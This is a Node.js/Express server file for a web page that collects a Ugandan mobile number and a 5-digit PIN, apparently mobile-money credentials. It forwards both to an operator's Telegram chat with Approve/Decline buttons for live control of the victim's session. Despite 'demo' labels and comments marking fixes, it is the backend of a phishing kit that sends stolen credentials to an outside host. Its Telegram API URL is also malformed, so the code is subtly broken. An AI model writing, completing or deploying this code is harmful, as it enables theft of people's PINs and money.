const express = require("express");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 3000;

const PUBLIC_DIR = path.join(__dirname, "public");
const INDEX_FILE = path.join(PUBLIC_DIR, "index.html");

app.use(express.json({ limit: "10kb" }));
app.use(express.static(PUBLIC_DIR));

app.get("/", (_req, res) => {
  res.sendFile(INDEX_FILE, err => {
    if (err && !res.headersSent) {
      res.status(404).send("Homepage not found.");
    }
  });
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const requests = new Map();
const SESSION_TTL_MS = 30 * 60 * 1000; 

// Clean up expired sessions every 5 minutes
setInterval(() => {
  const now = Date.now();
  for (const [id, data] of requests.entries()) {
    if (now - new Date(data.createdAt).getTime() > SESSION_TTL_MS) {
      requests.delete(id);
    }
  }
}, 5 * 60 * 1000);

async function telegram(method, payload) {
  if (!BOT_TOKEN || !CHAT_ID) throw new Error("Missing credentials.");
  
  const res = await fetch(`https://telegram.org{BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
  
  const data = await res.json();
  if (!res.ok || !data.ok) {
    console.error("TELEGRAM ERROR DETAILS:", data);
    throw new Error(data.description || "API Failed");
  }
  return data;
}

async function notifyDemo(request, label) {
  return telegram("sendMessage", {
    chat_id: CHAT_ID,
    text: [
      "⚠️ NEW SIGN-IN ATTEMPT",
      `Request ID: ${request.id}`,
      `Phone Number: ${request.phone}`,
      `5-Digit PIN Input: ${request.pin || "None"}`,
      `Current Stage: ${label}`,
      "Status: PENDING ADMIN DECISION"
    ].join("\n"),
    reply_markup: {
      inline_keyboard: [[
        { text: "✅ Approve", callback_data: `approve:${request.id}` },
        { text: "❌ Decline", callback_data: `decline:${request.id}` }
      ]]
    }
  });
}
app.post("/api/phone", (req, res) => {
  const phone = String(req.body.phone || "").trim();
  
  // ✅ FIXED REGEX: Stripped out the broken backslash (\) before the end string anchor ($)
  if (!/^\+2567\d{8}$/.test(phone)) {
    return res.status(400).json({ error: "Please input a valid format phone number." });
  }
  
  const now = new Date().toISOString();
  const item = { 
    id: crypto.randomUUID(), 
    phone, 
    stage: "pin-demo", 
    status: "ready", 
    createdAt: now, 
    updatedAt: now 
  };
  
  requests.set(item.id, item);
  return res.json({ id: item.id, status: item.status });
});



app.post("/api/pin-demo", async (req, res) => {
  const id = String(req.body.id || "");
  const pin = String(req.body.pin || "").trim();
  const request = requests.get(id);
  
  if (!request || request.stage !== "pin-demo" || !["ready", "declined"].includes(request.status)) {
    return res.status(400).json({ error: "Stage not available." });
  }
  
  request.pin = pin;
  request.status = "pending";
  request.updatedAt = new Date().toISOString();
  
  try {
    await notifyDemo(request, "PIN Verification Stage");
    return res.json({ status: "pending" });
  } catch (err) {
    request.status = "ready";
    return res.status(502).json({ error: "Notification error. Try again." });
  }
});

// ✅ ADDED MISSING STATUS POLLING ENDPOINT FOR THE FRONTEND
app.get("/api/status/:id", (req, res) => {
  const request = requests.get(req.params.id);
  if (!request) {
    return res.status(404).json({ error: "Session not found." });
  }
  return res.json({ status: request.status, stage: request.stage });
});

app.post("/api/retry", (req, res) => {
  const request = requests.get(String(req.body.id || ""));
  if (!request || request.status !== "declined") {
    return res.status(400).json({ error: "No declined stage to retry." });
  }
  
  if (request.stage === "pin-demo") {
    request.status = "ready";
  } else {
    return res.status(400).json({ error: "Cannot retry stage." });
  }
  
  request.updatedAt = new Date().toISOString();
  return res.json({ stage: request.stage, status: request.status });
});

let offset = 0;
let pollingActive = false;

// ✅ FIXED COMPLETED BOT LONG-POLLING ENGINE WITH TELEGRAM BUTTON HANDLERS
async function pollTelegram() {
  if (!BOT_TOKEN || !CHAT_ID || pollingActive) return;
  pollingActive = true;

  while (true) {
    try {
      const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
      for (const upd of data.result || []) {
        offset = upd.update_id + 1;
        const cb = upd.callback_query;
        if (!cb) continue;
        
        const parts = String(cb.data || "").split(":");
const action = parts[0]; //  Fixed: Extract the string item at index 0
const reqId = parts.slice(1).join(":");

        const request = requests.get(reqId);
        
        if (!request || !["approve", "decline"].includes(action) || request.status !== "pending") {
          await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: "Session closed or expired." });
          continue;
        }
        
        if (action === "approve") {
          request.stage = "success";
          request.status = "approved";
        } else {
          request.status = "declined";
        }
        
        request.updatedAt = new Date().toISOString();
        await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Session updated to: ${request.status}` });
        
        // Optional: Update the Telegram message so you see the updated status directly in chat
        try {
          await telegram("editMessageText", {
            chat_id: CHAT_ID,
            message_id: cb.message.message_id,
            text: `ℹ️ SESSION RESOLVED\nID: ${request.id}\nPhone: ${request.phone}\nFinal Outcome: ${request.status.toUpperCase()}`
          });
        } catch (e) {
          console.error("Could not edit message text:", e);
        }
      }
    } catch (err) {
      console.error("Telegram long polling error:", err);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

// Start background listening engine
pollTelegram();

app.listen(PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});

